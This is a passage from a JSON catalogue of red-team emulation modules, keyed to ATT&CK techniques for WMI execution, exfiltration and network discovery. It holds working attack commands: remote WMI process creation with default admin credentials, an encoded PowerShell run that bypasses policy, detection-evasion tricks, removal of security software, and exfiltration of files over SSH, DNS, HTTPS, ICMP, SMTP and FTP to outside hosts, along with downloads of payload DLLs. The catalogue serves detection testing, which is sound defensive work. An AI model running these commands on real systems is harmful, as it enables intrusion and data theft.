        "command": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute}\n",
        "elevation_required": false,
        "cleanup_command": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process where name='#{process_to_execute}' delete >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "node",
          "description": "Ip Address",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "user_name",
          "description": "Username",
          "type": "string",
          "default_value": "DOMAIN\\Administrator"
        },
        {
          "name": "password",
          "description": "Password",
          "type": "string",
          "default_value": "P@ssw0rd1"
        },
        {
          "name": "process_to_execute",
          "description": "Name or path of process to execute.",
          "type": "string",
          "default_value": "notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9c8ef159-c666-472f-9874-90c8d60d136b",
      "module_name": "WMI Execute Remote Process"
    },
    {
      "index": 234,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the EncodedCommand, once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs -ComputerName WORKSTATION\nThe EncodedCommand in this raglox is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7db7a7f9-9531-4840-9b30-46220135441c",
      "module_name": "Create a Process using WMI Query and an Encoded Command"
    },
    {
      "index": 235,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"#{new_class}\")\n$NewClass.Put()\nInvoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}\n",
        "elevation_required": true,
        "cleanup_command": "$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"#{new_class}\"))\ntry { $CleanupClass.Delete() } catch {}\n"
      },
      "variables": [
        {
          "name": "new_class",
          "description": "Derived class name",
          "type": "string",
          "default_value": "Win32_RAGLOX"
        },
        {
          "name": "process_to_execute",
          "description": "Name or path of process to execute.",
          "type": "string",
          "default_value": "notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "10447c83-fc38-462a-a936-5102363b1c43",
      "module_name": "Create a Process using obfuscated Win32_Process"
    },
    {
      "index": 236,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\"\n",
        "elevation_required": false,
        "cleanup_command": "taskkill /f /im calculator.exe"
      },
      "variables": [
        {
          "name": "node",
          "description": "Ip Address",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "dll_to_execute",
          "description": "Path to DLL.",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\calc.dll"
        },
        {
          "name": "function_to_execute",
          "description": "Name of DLL function to call",
          "type": "string",
          "default_value": "StartW"
        }
      ],
      "prerequisites": [
        {
          "description": "DLL with function to execute must exist on disk at specified location (#{dll_to_execute})",
          "check_command": "if (Test-Path \"#{dll_to_execute}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1047/bin/calc.dll?raw=true\" -OutFile \"#{dll_to_execute}\"\n"
        }
      ],
      "rx_module_id": "00738d2a-4651-4d76-adf2-c43a41dfb243",
      "module_name": "WMI Execute rundll32"
    },
    {
      "index": 237,
      "technique_id": "T1047",
      "technique_name": "Windows Management Instrumentation",
      "description": "Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall",
        "elevation_required": true,
        "cleanup_command": "msiexec /i \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\tightvncinstaller.msi\" /qn /norestart"
      },
      "variables": [
        {
          "name": "node",
          "description": "Computer the action is being executed against but defaults to the localhost.",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "product",
          "description": "Enter the product name being uninstalled.  This will default to TightVNC.",
          "type": "string",
          "default_value": "Tightvnc"
        }
      ],
      "prerequisites": [
        {
          "description": "TightVNC must be installed.",
          "check_command": "if ((Test-Path \"C:\\Program Files\\TightVNC\\tvnviewer.exe\")-Or (Test-Path \"C:\\Program Files (x86)\\TightVNC\\tvnviewer.exe\")) {exit 0} else {exit 1}",
          "install_command": "Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\tightvncinstaller.msi\"\nstart-sleep -s 10\nmsiexec /i \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\tightvncinstaller.msi\" /qn /norestart\nstart-sleep -s 15"
        }
      ],
      "rx_module_id": "c510d25b-1667-467d-8331-a56d3e9bc4ff",
      "module_name": "Application uninstall using WMIC"
    },
    {
      "index": 238,
      "technique_id": "T1048",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "target SSH domain",
          "type": "url",
          "default_value": "target.example.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f6786cc8-beda-4915-a4d6-ac2f193bb988",
      "module_name": "Exfiltration Over Alternative Protocol - SSH"
    },
    {
      "index": 239,
      "technique_id": "T1048",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user_name",
          "description": "username for domain",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "password",
          "description": "password for user",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "domain",
          "description": "target SSH domain",
          "type": "url",
          "default_value": "target.example.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7c3cb337-35ae-4d06-bf03-3032ed2ec268",
      "module_name": "Exfiltration Over Alternative Protocol - SSH"
    },
    {
      "index": 240,
      "technique_id": "T1048",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "description": "DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"#{ps_module}\"\nInvoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "password",
          "description": "Password used to encrypt the data to be exfiltrated",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "domain",
          "description": "The domain name to use for DNS requests",
          "type": "string",
          "default_value": "target.example.com"
        },
        {
          "name": "ps_module",
          "description": "DNSExfiltrator powershell ps_module",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\dnsexfil.ps1"
        },
        {
          "name": "doh",
          "description": "Google or CloudFlare DoH (DNS over HTTP) server",
          "type": "string",
          "default_value": "google"
        },
        {
          "name": "time",
          "description": "The time in milliseconds to wait between each DNS request",
          "type": "string",
          "default_value": "500"
        },
        {
          "name": "encoding",
          "description": "Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})\n",
          "check_command": "if (Test-Path \"#{ps_module}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIWR \"https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1\" -OutFile \"#{ps_module}\"\n"
        }
      ],
      "rx_module_id": "c943d285-ada3-45ca-b3aa-7cd6500c6a48",
      "module_name": "DNSExfiltration (doh)"
    },
    {
      "index": 241,
      "technique_id": "T1048",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "description": "This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and \nmaking DNS queries via the dig command to a controlled DNS server.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "bash",
        "command": "dig @#{attacker_dns_server} -p #{dns_port} $(echo \"#{secret_info}\" | base64).google.com\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dns_port",
          "description": "Attacker's DNS server port",
          "type": "integer",
          "default_value": "53"
        },
        {
          "name": "attacker_dns_server",
          "description": "Attacker's DNS server address",
          "type": "string",
          "default_value": "8.8.8.8"
        },
        {
          "name": "secret_info",
          "description": "secret info that will be exfiltirated",
          "type": "string",
          "default_value": "this is a secret info"
        }
      ],
      "prerequisites": [
        {
          "description": "dig command",
          "check_command": "which dig",
          "install_command": "which apt && sudo apt update && sudo apt install -y bind9-dnsutils || which yum && sudo yum install -y bind-utils || which dnf && sudo dnf install -y bind-utils || which apk && sudo apk add bind-tools || which pkg && sudo pkg update && sudo pkg install -y bind-tools || which brew && brew update && brew install --quiet bind\n"
        }
      ],
      "rx_module_id": "a27916da-05f2-4316-a3ee-feec67a437be",
      "module_name": "Exfiltrate Data using DNS Queries via dig"
    },
    {
      "index": 242,
      "technique_id": "T1048.002",
      "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Test file to upload",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1048.002/src/artifact"
        },
        {
          "name": "curl_path",
          "description": "path to curl.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\Curl.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Curl must be installed on system.\n",
          "check_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\" -Outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\n"
        },
        {
          "description": "#{input_file} must be exist on system.\n",
          "check_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1048.002/src/artifact\" -OutFile \"#{input_file}\"\n"
        }
      ],
      "rx_module_id": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0",
      "module_name": "Exfiltrate data HTTPS using curl windows"
    },
    {
      "index": 243,
      "technique_id": "T1048.002",
      "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "bash",
        "command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Test file to upload",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1048.002/src/artifact"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
      "module_name": "Exfiltrate data HTTPS using curl freebsd,linux or macos"
    },
    {
      "index": 244,
      "technique_id": "T1048.002",
      "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "description": "Exfiltrate data over HTTPS using wget --post-file method\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "wget --post-file=\"#{input_file}\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Test data to upload",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1048.002/src/artifact"
        },
        {
          "name": "endpoint_domain",
          "description": "Endpoint to send data to",
          "type": "string",
          "default_value": "https://example.com/"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7ccdfcfa-6707-46bc-b812-007ab6ff951c",
      "module_name": "Exfiltrate data in a file over HTTPS using wget"
    },
    {
      "index": 245,
      "technique_id": "T1048.002",
      "technique_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "description": "Exfiltrate data over HTTPS using wget --post-data method\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "wget --post-data=\"msg=RAGLOXTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "endpoint_domain",
          "description": "Endpoint to send data to",
          "type": "string",
          "default_value": "https://example.com/"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8bec51da-7a6d-4346-b941-51eca448c4b0",
      "module_name": "Exfiltrate data as text over HTTPS using wget"
    },
    {
      "index": 246,
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
      "description": "A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff",
      "module_name": "Exfiltration Over Alternative Protocol - HTTP"
    },
    {
      "index": 247,
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
      "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path to file to be exfiltrated.",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\notepad.exe"
        },
        {
          "name": "ip_address",
          "description": "Destination IP address where the data should be sent.",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "dd4b4421-2e25-4593-90ae-7021947ad12e",
      "module_name": "Exfiltration Over Alternative Protocol - ICMP"
    },
    {
      "index": 248,
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
      "description": "Exfiltration of specified file over DNS protocol.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c403b5a4-b5fc-49f2-b181-d1c80d27db45",
      "module_name": "Exfiltration Over Alternative Protocol - DNS"
    },
    {
      "index": 249,
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
      "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path to file to exfiltrate",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\notepad.exe"
        },
        {
          "name": "ip_address",
          "description": "Destination IP address where the data should be sent",
          "type": "string",
          "default_value": "http://127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6aa58451-1121-4490-a8e9-1dada3f1c68c",
      "module_name": "Exfiltration Over Alternative Protocol - HTTP"
    },
    {
      "index": 250,
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
      "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 RX Module\" -Attachments #{input_file} -SmtpServer #{smtp_server}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path to file to exfiltrate",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\notepad.exe"
        },
        {
          "name": "sender",
          "description": "The email address of the sender",
          "type": "string",
          "default_value": "test@corp.com"
        },
        {
          "name": "receiver",
          "description": "The email address of the receiver",
          "type": "string",
          "default_value": "test@corp.com"
        },
        {
          "name": "smtp_server",
          "description": "SMTP server to use for email transportation",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ec3a835e-adca-4c7c-88d2-853b69c11bb9",
      "module_name": "Exfiltration Over Alternative Protocol - SMTP"
    },
    {
      "index": 251,
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
      "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n",
        "elevation_required": false,
        "cleanup_command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n"
      },
      "variables": [
        {
          "name": "ftp_server",
          "description": "FTP Server address",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "username",
          "description": "Username for FTP server login",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "Password for FTP server login",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [],
      "rx_module_id": "57799bc2-ad1e-4130-a793-fb0c385130ba",
      "module_name": "MAZE FTP Upload"
    },
    {
      "index": 252,
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
      "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ftp_server",
          "description": "Your own ftp server",
          "type": "string",
          "default_value": "ftp.dlptest.com"
        },
        {
          "name": "ftp_pass",
          "description": "Your FTP user's password",
          "type": "string",
          "default_value": "rNrKYTX9g7z3RgJRmxWuGHbeu"
        },
        {
          "name": "ftp_user",
          "description": "Your FTP username",
          "type": "string",
          "default_value": "dlpuser"
        },
        {
          "name": "ftp_port",
          "description": "Your FTP's port",
          "type": "integer",
          "default_value": 21
        }
      ],
      "prerequisites": [
        {
          "description": "Check if the exfil package exists\n",
          "check_command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
          "install_command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n"
        },
        {
          "description": "Check if rclone zip exists",
          "check_command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n"
        }
      ],
      "rx_module_id": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b",
      "module_name": "Exfiltration Over Alternative Protocol - FTP - Rclone"
    },
    {
      "index": 253,
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
      "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3ea1f938-f80a-4305-9aa8-431bc4867313",
      "module_name": "Python3 http.server"
    },
    {
      "index": 254,
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. `net sessions` requires\nelevated privileges; on standard user accounts this command may not return results. Results will output via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netstat -ano\nnet use\nnet sessions 2>nul\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0940a971-809a-48f1-9c4d-b1d785e96ee5",
      "module_name": "System Network Connections Discovery"
    },
    {
      "index": 255,
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "description": "Get a listing of network connections.\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-NetTCPConnection\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f069f0f1-baad-4831-aa2b-eddac4baac4a",
      "module_name": "System Network Connections Discovery with PowerShell"
    },
    {
      "index": 256,
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "description": "Enumerate TCP connections and map to owning process names via PowerShell.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-NetTCPConnection | ForEach-Object {\n  $p = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue\n  [pscustomobject]@{\n    Local   = \"$($_.LocalAddress):$($_.LocalPort)\"\n    Remote  = \"$($_.RemoteAddress):$($_.RemotePort)\"\n    State   = $_.State\n    PID     = $_.OwningProcess\n    Process = if ($p) { $p.ProcessName } else { $null }\n  }\n} | Sort-Object State,Process | Format-Table -AutoSize\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b52c8233-8f71-4bd7-9928-49fec8215cf5",
      "module_name": "System Network Connections Discovery via PowerShell (Process Mapping)"
    },
    {
      "index": 257,
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "description": "List active TCP/UDP network connections using ss, with lsof as a fallback\nwhen ss is unavailable. Serves as an alternative to the netstat-based test.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bcf05343-ef1d-4052-8a27-b00c9be42b9f",
      "module_name": "System Network Connections Discovery via ss or lsof (Linux/MacOS)"
    },
    {
      "index": 258,
      "technique_id": "T1049",
      "technique_name": "System Network Connections Discovery",
      "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "netstat\nwho -a\n",
        "elevation_required": false,
